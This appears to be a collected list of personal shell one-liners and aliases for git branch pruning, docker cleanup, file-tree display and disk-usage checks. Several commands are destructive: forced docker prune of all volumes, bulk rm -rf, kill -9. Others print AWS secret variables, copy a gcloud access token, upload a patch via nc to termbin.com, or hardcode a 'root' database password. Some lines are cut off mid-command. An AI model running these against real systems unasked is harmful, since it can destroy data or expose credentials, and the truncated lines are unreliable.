git branch -r --merged | grep -v master | grep origin | sed 's/origin\///' | xargs -n 1 git push --delete origin
git branch -r --merged | grep -v 'master\|develop' | sed 's/origin\///' | xargs -n 1 git push --delete origin && git remote prune origin
git branch -d `git branch | ack 'feature/'`; git branch -d `git branch | ack 'bug/'`; git branch -d `git branch | ack 'chore/'`; git branch -d `git branch | ack 'hotfix/'`;
git branch -d $(git branch -r --merged | grep origin/ | grep -v master | grep -v develop | sed s~origin/~~)
git branch -a | cut -b 3- | perl -pe 's#^remotes/origin/###' | perl -nlE 'say if !\$c{\$_}++' | grep -v -- \
git branch -a --merged | grep -v master | grep remotes/origin| sed -e 's% *remotes/origin/%%' | xargs -I% git push origin :%
git branch -a --merged | 'grep' -v '*' | 'grep' -v master | 'grep' remotes/origin/ | sed -e 's% *remotes/origin/%%'
git branch --remotes | grep -v '\->' | peco | sed 's/origin\///' | xargs git checkout
git branch --merged|grep -E -v '\*|develop|master'|xargs git branch -d
git branch --merged|egrep -v '\\*|develop|master'|xargs git branch -d
git branch --merged|egrep -v '\*|develop|master'|xargs git branch -d
git branch --merged| egrep -v '(^\*|master|production)' | xargs git branch -d
git branch --merged=develop | egrep -v '\*|develop|master' | xargs git branch -d
git branch --merged |egrep -v '\\*|develop|master'|xargs git branch -d
git branch --merged | grep -vE '^\*|master$|v[0-9]\.[0-9]$' | xargs -I % git branch -D %
git branch --merged | grep -vE '^\*|master$|develop$' | xargs -p -I % git branch -d %
git branch --merged | grep -vE '^\*|master$|develop$' | xargs -I % git branch -d % && git fetch --prune
git branch --merged | grep -vE '^\*|master$|develop$' | xargs -I % git branch -d %
git branch --merged | grep -vE '(\*)|(master)|(dev)' | xargs -n 1 git branch -d
git branch --merged | grep -v dev | grep -v master | grep -v NULL | xargs -n 1 git branch -d
git branch --merged | grep -v \* | grep -v master | grep -v develop | xargs git branch -D
git branch --merged | grep -v \* | grep -v '^\s*master$' | grep -v '^\s*develop$' | xargs -t -n 1 git branch -d
git branch --merged | grep -v '\\*\\|master\\|develop' | xargs -n 1 git branch -d
git branch --merged | grep -v '\*\|master\|develop' | xargs -n 1 git branch -d
git branch --merged | grep -v '\*' | grep -v master | grep -v develop | xargs -n 1 git branch -d
git branch --merged | grep -v '\*' | grep -v master | grep -v dev | xargs -n 1 git branch -d
git branch --merged | grep -v '\*' | grep -v 'master' | grep -v 'develop' | xargs -n 1 git branch -d
git branch --merged | grep -v '\*' | egrep -v 'master|development' | xargs -n 1 git branch -d
git branch --merged | egrep -v “(^\*|master|production)” | xargs git branch -d
git branch --merged | egrep -v '\*|next|master' | xargs -L 1 -n 1 git branch --delete
git branch --merged | egrep -v '\*|develop|master' | xargs git branch -d
git branch --merged | egrep -v '(^\*|master|release)' |xargs -r git branch -d
git branch --merged | egrep -v '(^\*|master|develop|release)'
git branch --merged | egrep -v '(^\*|master|develop)' | xargs -n 1 git branch -d
git branch --merged | egrep -v '(^\*|master|dev)' | xargs git branch -d && git remote prune origin
git branch --merged | egrep -v '(^\*|master|dev)' | xargs git branch -d
git branch --merged | /usr/local/bin/grep -v '^\*' | /usr/local/bin/grep -v -P '(demo)|(release)' | xargs -n 1 git branch -d
git branch --merged origin/master | grep -v '\\*\\|master\\|develop' | xargs -n 1 git branch -d
git branch --merged master | grep -vE '^\*|master$|develop$' | xargs -I % git branch -d %
git branch --merged master | egrep -iv '(master|production|staging)' | xargs -n 1 git branch -d
git branch --merged develop | grep -vE '^\*|master$|develop$' | xargs -I % git branch -d %
git branch --merged develop | grep -v develop | grep -v uat | grep -v master | xargs -n 1 git push --delete origin
git branch --list --no-color -r | grep root/ | tail +2 | sed 's/\// :/g' | xargs -n2 -p git push
git branch --list --no-color -r | grep origin/ | tail +2 | sed 's/\// :/g' | xargs -n2 -p git push
git branch --color=always | fzf --multi --color=dark --cycle --border --ansi | sed 's/*//' | awk '{print \$1}' | xargs git branch -d
gist -l | grep \`current_branch\` | cut -d ' ' -f 1 | cut -d '/' -f 4 | xargs gist -r
gg -E '\sp\$|\sp\s|\sp\;|binding\.pry|\sspecify\!' -- '*.rb'
get_pods_colorized --all-namespaces -owide | tail -n+2 | grep -Ev 'Running|Completed' | sort -k8 -d
gem environment | grep -A 1 'GEM PATH' | tail -n 1 | tr -s ' ' | cut -d ' ' -f 3
gdb ./`ls -rt | xargs file | grep -i elf | cut -d: -f1 | tail -1`
gcloud compute instances list | tail -1 | tr ' ' '\n' | tail -3 | head -1
gcloud builds list --ongoing | head -2 | tail -1 | cut -d ' ' -f 1 | xargs -I{} gcloud builds log --stream {}
gcloud auth login --format='flattened' | grep -o '^access_token:.*' | tr -s ' ' | cut -d' ' -f2 | pbcopy
gbn | sed -e 's/-/ /g' | tr -d '\r\n' |tee /dev/stderr | pbcopy
g br -vv|grep gone]|grep -v ^\*|awk '{print \$1;}'|xargs git br -d
g b --merged | grep -vE '^\*|master$|develop$' | xargs -I % git b -d %
function(){unset_aws;env |grep AWS_ACCESS_KEY_ID=;env |grep AWS_SECRET_ACCESS_KEY=;env |grep AWS_SESSION_TOKEN=;env |grep AWS_SECURITY_TOKEN=;}
fs=('01-api-server' '02-auth-server' '03-website' '04-admin' '05-service-web-client'); for f in $fs; do echo $f; echo '-------------'; colordiff -y <(cat config/$f.json | jq '.apps[0].env' | json -k) <(cat deployment/config/$f-int.json | jq '.apps[0].env' | json -k); done
fortune -a | fmt -80 -s | $(shuf -n 1 -e cowsay cowthink) -$(shuf -n 1 -e b d g p s t w y) -f $(shuf -n 1 -e $(cowsay -l | tail -n +2)) -n | lolcat
for line in `docker ps | awk '{print $1}' | grep -v CONTAINER`; do docker ps | grep $line | awk '{printf $2\
for i in \$(dcos cluster list | tail -n +2 | awk {'print \$1'}); do echo \$i | sed 's/*//g' | xargs dcos cluster remove ; done
for f in $(find -type f); do file -L $f | grep -q -E ELF\|executable && chmod -c a+x $f; done || true
find|egrep '[.]zip$'|sedesc|sed -e 's/^.*$/( mkdir & \&\& mv & & \&\& ( cd & \&\& unzip -q *.zip ) \&\& rm &\/& )/' -e 's/[.]zip[ ][&]/\&/g' -e 's/[.]zip[/]\([^/]*[/]\)*/\//'|sh
find|egrep '[.]7z$'|sedesc|sed -e 's/^.*$/( mkdir & \&\& mv & & \&\& ( cd & \&\& 7z x *.7z ) \&\& rm &\/& )/' -e 's/[.]7z[ ][&]/\&/g' -e 's/[.]7z[/]\([^/]*[/]\)*/\//'|sh
find ~/Documents/LimeChatTranscripts/ | xargs grep -i ume | grep -v joined | grep -v left | less
find ~ -name '*.log' -print0 | xargs -0 -L1 stat -f'%z %N' | sort -rn | tee fat-logfiles.txt | head
find | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find | sed 's|[^/]*/|- |g'
find | grep -P '.go$' | xargs cat | sed -r '/^(\s*\/\/.*)?$/d' | wc -l
find storage/logs -name '*.log'|xargs ls -lt|awk '{print \$9}'|head -n 1|xargs tail -fn 100
find \$(git status|egrep 'rb$|rake$|ru$' | sed -e 's/.*://' -e 's/\s*//') -exec echo -en {} ': ' \; -exec ruby -c {} \;
find /var/log/ -type f | xargs file | grep ASCII | cut -d: -f1 | xargs tail -f
find /var/log -type f -exec file {} \; | grep 'text' | cut -d ' ' -f1 | sed -e's/:$//g' | grep -v \
find .; -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find ./ | grep -E '(__pycache__|\.pyc|\.pyo$)' | xargs rm -rf
find ./ -type d -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . | xargs -I {} chown dev:dev {} ; find . -type d | xargs -I {} chmod 770 {} ; find . -type f | xargs -I {} chmod 660 {} ; find . | xargs -I {} chcon -R -t httpd_sys_rw_content_t {}
find . | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . | sed 's|[^/]*/|- |g'
find . | sed 's/[^/]*\\//| /g;s/| *\\([^| ]\\)/+--- \\1/'
find . | sed 's/[^/]*\//| /g;s/| *\([^| ]\)/+--- \1/'
find . | grep -v .svn | grep -v .hg | grep -v .git | grep
find . | grep -v .svn | grep -v .git | grep -v \~$ | xargs grep -Iisn
find . | grep -e pyc$ | xargs rm && find . | grep pycache | xargs rm -rf
find . | grep -E '(pycache|\.pyc|\.pyo$)' | xargs rm -rf
find . | grep -E '(__pycache__|\.pyc|\.pyo$)' | xargs rm -rf
find . | grep '\.h$\|\.hpp$\|\.inc$\|\.def$'
find . | grep '\.c$\|\.cpp$\|\.pc$\|\.pcpp$'
find . | cut -d/ -f2 | sort | uniq -c | sort -bn
find . \( -name \*.apk -o -name \*.ipa \) -print0 | xargs -0 du | sort -nr | cut -f2- | xargs du -hs
find . \( ! -regex '.*/\..*' \) -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -type f | sed -e 's/.*\.//' | sort | uniq -c | sort -rn
find . -type f | sed -E 's/.+[\./]([^/\.]+)/\1/' | sort | uniq -c | sort -nr
find . -type f | sed 's/.*\///' | sed 's/.*\.//' | sort | uniq -c
find . -type f | grep \.js | grep -v node_modules | grep -v bower_components | xargs grep
find . -type f | grep -vF .git | grep -vF .DS_Store | grep -vF .keep | grep -vF /node_modules/
find . -type f | awk -F'.' '{print \$NF}' | sort| uniq -c | sort -g
find . -type f | awk -F'.' '{print $NF}' | sort| uniq -c | sort -g
find . -type f -regex '.*\.\(c\|cpp\|h\|hpp\)' | xargs clang-format -i
find . -type f -print0 | xargs -0 stat --format '%Z :%z %n' | sort -nr | cut -d: -f2- | head -n 20
find . -type f -o -type l | grep -v svn | grep -v cscope | grep -vi tags | xargs grep
find . -type d|sed -e 's/[^-][^\/]*\// |/g' -e 's/|\([^ ]\)/|-\1/'
find . -type d | xargs du -h | sort -hr | uniq | head
find . -type d | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -type d | sed -e 's/[^-][^\/]*\// |/g' -e 's/|\([^ ]\)/|-\1/'
find . -type d | sed 's/[^/]*\//| /g;s/| *\([^| ]\)/+--- \1/'
find . -type d -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -regex '.*\.\(vim\|h\|hpp\|c\|cpp\)$' -type f -exec chmod -x {} \;
find . -regex '.*\.\(cpp\|hpp\|cc\|cxx\|h\)' -exec clang-format -style=file -i {} \;
find . -print|sed -e's;[^/]*/;|___;g;s;____|; |;g;'
find . -print|sed 's;[^/]*/;|__;g;s;__|; |;g'
find . -print | sed -e 's;[^/]*/;|________;g;s;________|; |;g'
find . -print | sed -e 's;[^/]*/;|_____;g;s;_____|; |;g'
find . -print | sed -e 's;[^/]*/;|____;g;s;____|;|;g'
find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -print | sed -e 's;[^/]*/;|___;g;s;___|; |;g'
find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g'
find . -print | sed -e 's;[^/]*/;|_;g;s;_|; |;g'
find . -print | sed -e 's;[^/]*/;|--;g;s;--|; |;g'
find . -print | sed -e 's;[^/]*/;|---;g;s;---|; |;g'
find . -print | sed -e 's;[^/]*/;|-- ;g;s;--|; |;g'
find . -print | sed -e 's;[^/]*/;|-- ;g;s;-- |; |;g'
find . -print | sed -e 's:[^/]*/:|____:g;s:____|: |:g'
find . -print | sed 's;[^/]*/;|___;g;s;___|; |;g'
find . -not -wholename '*/.git/*' -not -wholename '*/.bzr/*' -not -name '.bzr' -not -name '.git' -not -name '.DS_Store' -not -name '*.sw?' -not -name '*~' -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g'
find . -not -wholename '*/.git/*' -not -wholename '*/.bzr/*' -not -name '.bzr' -not -name '.git' -not -name '*.sw?' -not -name '*~' -not -wholename '*/node_modules/*' -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g'
find . -not -path './.git/*' -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -not -path '*/\.*' -print | sed -e 's;[^/]*/;|;g;s;|; |;g'
find . -maxdepth 4 -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -maxdepth 4 -mtime -90 -printf '%T+\t%s\t%p\n' 2>/dev/null | sort -r | cut -f 3 | cut -d'/' -f-3 | awk '!a[\$0]++'
find . -maxdepth 3 -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -P6 -I {} git -C {} pull
find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} sh -c 'echo \
find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} npm -C {} i
find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} git -C {} pull
find . -maxdepth 3 -name .git -type d | rev | cut -c 6- | rev | xargs -I {} git -C {} fetch
find . -maxdepth 2 -type f -printf '%T@ %p\0' | sort -zk 1nr | sed -z 's/^[^ ]* //' | tr '\0' '\n' | head -n 20
find . -maxdepth 2 -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -maxdepth 2 -not -path '*/\.*' -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -maxdepth 1 -type f | cut -d '.' -f2- | cut -c 2- | grep -vE '^\.' | xargs ls -lah --color=auto
find . -maxdepth 1 -type d -printf '%T@ %p\0' | sort -zk 1nr | sed -z 's/^[^ ]* //' | tr '\0' '\n' | head -n 20
find . -maxdepth 1 -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find . -maxdepth 1 -mindepth 1|xargs du -sk | sort -rn | cut -f2 | xargs du -sh
find . ! -path '*svn*' ! -path '*lib*' ! -path '*target*' ! -path '*class' ! -path '*pyc' ! -path '*idea*' ! -path '*swp' ! -path '*iml' | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find -regextype posix-extended -regex '.*\.(c|cpp|h|md)' | xargs wc -l
find -maxdepth 1 -type f -print0|xargs -r0 ls -tr1|tail -1|tr -d '\n' |xargs -0
find -iname *.java | grep -v package-info.java | grep -v yang-gen | grep -v target | sed
find -E . -regex '.*(dist|node_modules|yarn.lock|package-lock.json)$' | xargs rm -rf
find '${HOME}' -type f -name '*.py' -printf '%T@ %p\n' | sort --numeric --stable --key=1 | tail -n 1 | cut -d' ' -f2 | ed
find ${1:-.} -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
find $SENSEYE_BACKEND -name 'fig.yml' -o -name 'docker-compose.yml' -exec cat {} \; | grep -E '\b5[0-9]+:[0-9]+' | sed -E 's/[^0-9]*([0-9]+):([0-9]+)[^0-9]*/\1/g' | sort -n | tail -1
find $FIND_EGREP -regex '.*swo|.*swp|.*pyc|.*pyo|.*~' -exec rm {} \;
find $1 -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- | head -n 15
find $(ghq root)/*/*/* -type d -prune -exec ls -ld --time-style='+%Y%m%d%H%M%S' {} \; | sort -rk6 | sed -e 's#'.*$(ghq root)'/##' | peco | xargs -I {} code $(ghq root)/{}
fif util.inspect | grep -v err | grep -v tests | grep -v \.error | grep -v return
fd -t f -j4 | grep -o '\.[^./]*$' | sort | uniq -c | sort -g
fc -l | tail -n 1 | sed -E 's/\s?[0-9]+//' | sed -E 's/^ *//' | pbcopy
fc -l -n 1 | gsort | guniq -c | gsort -rn | ghead -20
exenv install \$(exenv install -l | sort -n | egrep -v 'rc|Docs' | tail -1)
env | sort | egrep 'ROS|CATKIN|CMAKE'
enonic sandbox ls | sed -e 's*^\W\W**g' | awk '{print \$1}' | fzf | xargs enonic sandbox start
elinks www.weather.weatherbug.com/AR/Maumelle-weather.html -dump | grep -i 'Hi:\|Lo:\|Rain:\|Gust'
elinks -dump randomfunfacts.com | sed -n '/^|/p' | tr -d \|
elinks -dump randomfunfacts.com | sed -n '/^| /p' | tr -d \|
elinks -dump randomfunfacts.com | grep '^|' | tr -d \|
egrep '^bind' ~/.config/i3/config | cut -d' ' -f 2- | sed 's/ /\t/' | column -ts $'\t' | less
egrep '(mp4|webm|flv|mkv|avi)'
echo; curl https://real-debrid.com/vpn | prettier --parser html | rg --trim --after-context=15 'VPN Information' | rg --passthru --regexp='(error|success)'
echo playing | toilet | lolcat ; echo ingress | toilet | lolcat ;
echo networksetup -ordernetworkservices Ethernet \`networksetup -listallnetworkservices | grep -v 'An asterisk ' | sed s/\^'*'// | grep -xv Ethernet | sed 's/.*/\
echo networksetup -ordernetworkservices AirPort \`networksetup -listallnetworkservices | grep -v 'An asterisk ' | sed s/\^'*'// | grep -xv AirPort | sed 's/.*/\
echo get top process eating memory; echo ps auxf | sort -nr -k 4 | head -10; ps auxf | sort -nr -k 4 | head -10
echo get top process eating cpu; echo ps auxf | sort -nr -k 3 | head -10; ps auxf | sort -nr -k 3 | head -10
echo curl $(git format-patch -k --stdout HEAD^..HEAD | nc termbin.com 9999) \| git am | tee /dev/tty | pbcopy
echo `head /dev/urandom | base64 | tr -d / | tr -d + | head -c 32`
echo `/usr/games/fortune` | cowsay -f $(/bin/ls /usr/share/cowsay/cows -1 | head -n $(expr $$$(date +%s) % $(ls /usr/share/cowsay/cows | wc -w) + 1) | tail -n 1)
echo \`bitcoin-cli -testnet getblockcount 2>&1\`/\`wget -O - http://blockexplorer.com/testnet/q/getblockcount 2> /dev/null | cut -d : -f2 | rev | cut -c 2- | rev\`
echo \\\`bitcoin-cli getblockcount 2>&1\\\`/\\\`wget -O - http://blockexplorer.com/testnet/q/getblockcount 2> /dev/null | cut -d : -f2 | rev | cut -c 2- | rev\\\`
echo Master; amixer | grep -5 Master | grep %; echo Capture; amixer | grep Capture | grep %
echo ; echo ; look . | gshuf | head -2 | tr '\\n' ' ' | tr '[:lower:]' '[:upper:]' ; echo ; echo; echo
echo -n 'total requested nodes: ' && squeue | grep PD | grep '(Priority)\|(None)' | awk '{sum+=\$7} END{print sum}'
echo -n 'X <= '; pwd; pwd | perl -pe 'chomp' | xclip ; pwd | perl -pe 'chomp' | xclip -selection clip
echo -n $(dmesg |awk /dvb_usb/'{ print $4 }'|awk -F: /-/'{ print $1 }'|tail -n 1)|sudo tee /sys/bus/usb/drivers/usb/unbind
echo -e '\tPID\t\tSource command\t\tArguments\n' && ps -o '<>%p<><>%c<><>%a' -e | grep python | head --lines=-1 | sed 's/<>/\\t/g' | sed 's/\/.* //g'
echo $PWD | tr / '\n' | xargs -I X sh -c 'echo X | head -c 1; echo' | tr '\n' /
echo $(tail -10 ~$(echo $USER | cut -d ' ' -f 1)/.zsh_history | grep -v ';su' | tail -1 |cut -d ';' -f 2)
echo $(hostname) netstat -nat | awk '{print \$6}' | sort | uniq -c | sort -n
du | sort -nr | cut -f2- | xargs du -hs | head -n 20
du -xS|sort -n|grep -v /4.trash|tail -n1|awk -v q='\
du -skL err.txt generated.file succ.txt 2> /dev/null | sort -nr | cut -f2 | xargs -d '\n' du -shL 2> /dev/null | head
du -sk ./err.txt ./generated.file ./succ.txt | sort -nr | awk '$awkstr' | sed 's/.\///g' | sed 's/$/\//g'
du -s err.txt generated.file succ.txt | egrep '^[0-9]+(\.[0-9]+)*G' | sort; du -s err.txt generated.file succ.txt | egrep '^[0-9]+(\.[0-9]+)*M' | sort
du -mx | sort --reverse --numeric-sort | head -46 | tail -45 | (echo 'Mb Directory\n-----------------' && command cat)
du -k | sort -nr | cut -f2 | head -15 | xargs -d '\n' du -sh
du -h | grep ^[0-9.]*M | sort -rn | head -n 20 | cut -d: -f2
du -h | grep ^[0-9.]*G | sort -rn | head -n 20 | cut -d: -f2
du -d1 | sort -nr | cut -f2- | xargs du -hs | head -n 20
du -a | sed '/.*\.\/.*\/.*/!d' | cut -d/ -f2 | sort | uniq -c
du -a | cut -d/ -f2 | sort | uniq -c | sort -nr
du --max-depth=1|sort -n|cut -f2|tr '\n' '\0'|xargs -0 du -sh 2>/dev/null
du --max-depth=1 -k err.txt generated.file succ.txt | sort -nr | cut -f2 | head -15 | xargs -d '\n' du -sh
ds | sort -hrs 2> /dev/null || ds | gsort -hrs 2> /dev/null
drill +short myip.opendns.com @resolver1.opendns.com | grep myip | tac | head -n 1 | cut -d ' ' -f 5
dolphin . || nautilus . || open .
dolphin . 2>/dev/null || nautilus . 2>/dev/null || open .
dockly-clean || true && dockly-pull || true && dockly-run
dockercleanc || true && dockercleanv || true && dockercleani
dockercleanc || true && dockercleani || true && dockercleanv
dockerclean-stopped-containers || true && dockerclean-untagged-images || true && dockerclean-orphaned-volumes
docker-del-all-images || true && docker-clean-images || true && docker-del-all-images
docker-clean-containers || true && docker-clean-images || true && docker-clean-volumes
docker rm -f kannel_routing; HOST_IP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | sed -n 1p) docker run --name kannel_routing -d -p 3040:3040 -e KANNEL_USER=kannelUser -e KANNEL_PASSWORD=kannelPassword -e REDIS_URL=redis://$HOST_IP:6379 -e MYSQL_HOST=$HOST_IP -e MYSQL_PORT=4406 -e MYSQL_USER=root -e MYSQL_PASSWORD=root kannel_routing
docker rm -f $(docker ps -a -q) || true && docker rmi -f $(docker images -q) || true && docker system prune -a -f --volumes
docker rm -f $(docker ps -a -q) || true && docker rmi -f $(docker images -q) || true
docker ps | tail -n +2 | fzf | awk '{print \$1}' | xargs docker attach
docker ps | grep -v CONTAINER | awk '{print $1}' | xargs docker inspect --format='{{.LogPath}}' | xargs rm -rf
docker ps | grep -v CONTAINER | awk '{print $1}' | xargs docker inspect --format='{{.LogPath}}' | xargs du -h
docker ps -aq | xargs docker stop -t 0 && docker ps -aq | xargs docker rm && docker images -aq | xargs docker rmi -f && docker volume ls | xargs docker volume rm
docker ps -a | tail -n +2 | fzf | awk '{print \$1}' | xargs docker rm
docker ps -a | tail +2 | awk '{ print $1 }' | uniq | xargs docker rm -f
docker ps -a | grep Exited | cut -d ' ' -f 1 | grep -v CONTAINER | xargs docker rm -f
docker ps -a | grep -v CONTAINER | tr -s ' ' | cut -d ' ' -f 1 | xargs docker rm
docker ps -a | grep -E '(weeks|months) ago' | awk '{print $1}' | gxargs --no-run-if-empty docker rm
docker ps -a | grep 'days ago\|weeks ago' | awk '{print $1}' | gxargs --no-run-if-empty docker rm
docker ps -a | grep 'Exited\|Created' | cut -d ' ' -f 1 | xargs docker rm
docker ps -a | grep 'Exit'|grep -v rancher-agent-state | awk '{print \$1}' | xargs -L 1 -r docker rm
docker ps -a | ack -v 'CONTAINER ID' | awk '{print \$1}' | head -1 | xargs docker logs
docker ps -a -q | xargs docker rm && docker images | grep '^<none>' | awk '{print \$3}' | xargs docker rmi
docker ps --all | grep -v sinopia | cut -f1 -d ' ' | grep -v CONTAINER | xargs docker rm -f
docker logs -tf $(docker ps -a | grep -v Exited | grep -v CONTAINER | fzf | awk
docker kill $(docker ps -q) || true && docker rm $(docker ps -a -q) || true && docker rmi $(docker images -q)
docker kill $(docker ps -q) || true && docker rm $(docker ps -a -q) || true && docker rmi $(docker images -q -f dangling=true)
docker kill $(docker ps -q) || true && docker rm $(docker ps -a -q) || true
docker kill $(docker ps -a -q) || true && docker rm $(docker ps -a -q) -f || true && docker rmi $(docker images -q) -f
docker kill $(docker ps -a -q) || docker rm $(docker ps -a -q) || true
docker info | tail -n+6 | head -n-3 | grep -v '└' | tail -n+2
docker images | tail -n +2 |grep '<none>' | awk '{print \$3}' | xargs -rn1 docker rmi
docker images | tail -n +2 | fzf | awk '{print \$3}' | xargs docker run
docker images | tail -n +2 | fzf | awk '{print \$3}' | xargs docker rmi
docker images | grep none| tr -s ' '| cut -d ' ' -f3 | xargs docker rmi
docker images | grep none | sed 's/\ \+/_/g' | cut -d_ -f3 | xargs docker rmi
docker images | grep -v jenkins | grep -v docker-agent | grep -v amazon-ecs-agent | grep -v
docker images | grep -v IMAGE | tr -s ' ' | cut -d ' ' -f 3 | xargs docker rmi -f
docker images | grep 'dealermanager\|none' | awk '{print $3}' | xargs docker rmi
docker images | grep '<none>' | tr -s ' ' | cut -d ' ' -f 3 | xargs docker rmi
docker images | grep '<none>' | awk '{ print \$3 }' | grep -v IMAGE | xargs docker rmi
docker images | fzf-tmux -m --tac | awk '{print \$3}' | sort -u | xargs docker rmi
docker images | egrep --color=never '\(\(dkr\)|\(gcr\)\)' | awk '{print \$3}' | xargs -n1 docker rmi -f
docker images --no-trunc | grep none | grep -v 'IMAGE' | awk '{print \$3}' | xargs -r docker rmi
docker exec -it $(docker ps -a | grep -v Exited | grep -v CONTAINER | fzf | awk
dmesg | egrep '^(cd|wd|sd|fd). at '
dmesg -T|sed -e 's|\\(^.*'$(date +%Y)']\\)\\(.*\\)|\\x1b[0;34m\\1\\x1b[0m-\\2|g'
dmesg -T|sed -e 's|\(^.*'`date +%Y`']\)\(.*\)|\x1b[0;34m\1\x1b[0m - \2|g'
dmesg -T|sed -e 's|\(^.*'`date +%Y`']\)\(.*\)|\x1b[0;33m\1\x1b[0m - \2|g'
dmesg -T | sed -e 's|\(^.*'`date +%Y`']\)\(.*\)|\x1b[0;34m\1\x1b[0m - \2|g'
dmesg -T --color=always|sed -e 's|\(^.*'`date +%Y`']\)\(.*\)|\x1b[0;34m\1\x1b[0m - \2|g'
dk-clean-containers || true && dk-clean-images || true && dk-clean-volumes
dirs -v | sort -k 2 | uniq -f 1 | sort -n -k 1 | head -n $(( LINES - 3 ))
diff -urB \$1 \$2 | grep -v 'Only in' | grep -v 'diff ' | sed -E 's#(---|\+\+\+) /.*/htdocs/(.*)#\1 \2#g'
df -hT | egrep '^/dev/[^[:blank:]]*$|[^[:blank:]Uti]*%|[^[:blank:]]*fs|ext[234]'
df -ah | head -n 1 ; df -ah | tail -n +2 | sort -rhk 2 | head -n 10
df -Th --total | egrep -v '(^none|^udev|^tmpfs|^cgmfs)'
deviceconsole | ack -i UI_SCRIPT | ack -v 'SCROLLER' | cut -d ' ' -f10-40 | spc -c ~/Dropbox/spcrc-nfapplog
declare -p | perl -pe 's|^declare [-\\w]+ ||;'
dd if=/dev/urandom bs=1 count=32 2>/dev/null | base64 | rev | cut -b 2- | rev
dd if=/dev/urandom bs=1 count=12 2>/dev/null | base64 | rev | cut -b 2- | rev
dcleanc || true && dcleani || true && dcleanv
date --iso-8601=seconds | sed -e's/^\(.\{19\}\)\(.*\)/\1/' | sed -e's/-//g' | sed -e's/://g' | sed -e's/T/-/g'
dalek Ruby && ps -e | grep ruby | sed -e 's/^[ \t]*//' | cut -f 1 -d ' ' | xargs kill -9
d=\`git status -s|head -n1|sed -e 's/^...\(.*\)/\1/'\` && [[ -z \$d ]] || cd \`dirname \$d\`
d | awk '\$2 ~ /.rb$/ || \$2 ~ /.rake$/ { print \$2 }' | xargs rubocop -aR
cvs update -d 2> /dev/null | grep -v '^?' | grep --color -E '(^|^U|^C.*)'
cut -f2 -d';' $HOME/.zsh_history | sort | uniq -c | sort -nr | head -n 30
cut -f1 -d' ' ~/.bash_history | sort | uniq -c | sort -nr | head -n 30
cut -d' ' -f1 | sort | uniq -c | sort -rg | head"
curl https://twiki.cern.ch/twiki/bin/view/Main/PdgId -Bs | w3m -dump -s -no-graph -T text/html | head -n 7 | tail -n 45| less
curl http://weather.gc.ca/rss/city/on-118_e.xml 2>/dev/null |grep title | sed 's/<title>//g' | sed 's/<.title>//g' | sed 's/&#xB0;//g'
curl -sI https://portal.triggit.com/login | grep Revision | awk '{print \$2}' | tr -d '\r' | open https://github.com/triggit/triggit-rails/commit/\$(cat)
curl -s https://raw.githubusercontent.com/PercussiveRepair/google-10000-english/master/google-10000-english-usa-no-swears-medium.txt | sort -R | tail -n 4 | tr -d '\n' | tr 'o' '0'; echo
curl -s https://api.thingspeak.com/channels/132817/fields/1.json?results=1 | python -mjson.tool | jq -r '.feeds | map(.field1)'|grep '[0-9]\{2\}.[0-9]'
curl -s http://mirrors.ubuntu.com/mirrors.txt | xargs -n1 -I {} sh -c 'echo $(curl -r 0-102400 -s -w %{speed_download} -o /dev/null {}/ls-lR.gz) {}' | sort -gr | head -3 | awk '{ print $2 }'
curl -s http://cbsg.sourceforge.net/cgi-bin/live | grep -Eo '<li>(.*?)</li>' | sed -e 's/<[^>]*>//g' | shuf -n 1 | cowsay -f kosh
curl -s -m 8 eth0.me || curl -s -m 5 ifconfig.me || curl -s -m 5 icanhazip.com
curl -Is slashdot.org | egrep '^X-(F|B|L)' | cut -d \- -f 2
curl --silent 'http://xml.weather.yahoo.com/forecastrss?p=15210&u=f' | grep -E '(Current Conditions:|F<BR)' | tail -n 1 | cut -d'<' -f 1
curl --compressed -s 'http://stream.pushshift.io/?type=comments' | grep data | cut -c 7- | jq '. | select(.subreddit==\
cpan -l 2>/dev/null | awk '{ print \$1 }' | sort | uniq | grep
cp ~/.bash_history ~/.bash_history.old && nl ~/.bash_history | sort -k 2 | uniq -f 1 | sort -n | cut -f 2 > ~/.bash_history.new && mv ~/.bash_history.new ~/.bash_history
condor_q | col 6 | drop 4 | head -n -2 | stats
condor_q $USER | col 6 | drop 4 | head -n -2 | stats
cond -w | grep Metis | col 10 | cut -d'/' -f8 | stats
comm -23 <(pacman -Qeq | sort) <(pacman -Qgq base base-devel xorg | cut -f 2 -d ' ' | sort) | less
comm -23 <(comm -23 <(pacman -Qeq | sort) <(pacman -Qgq base base-devel | sort)) <(pacman -Qmq | sort) | spm -Sw -
comm -23 <(apt-mark showmanual | sort -u) <(gzip -dc /var/log/installer/initial-status.gz | sed -n 's/^Package: //p' | sort -u) | tee
code --list-extensions | grep -E '(intelephense|php|twig)' | sort -f > ~/dotfiles/vscode/php.txt
clippaste | sq | paren | comma | clipcopy && pline
clear;( zcat $( ll -tr /var/log/apt/history.log*.gz ) ; \cat /var/log/apt/history.log ) | egrep '^(Start-Date:|Commandline:)' | grep -v aptdaemon | egrep -B1 '^Commandline:'
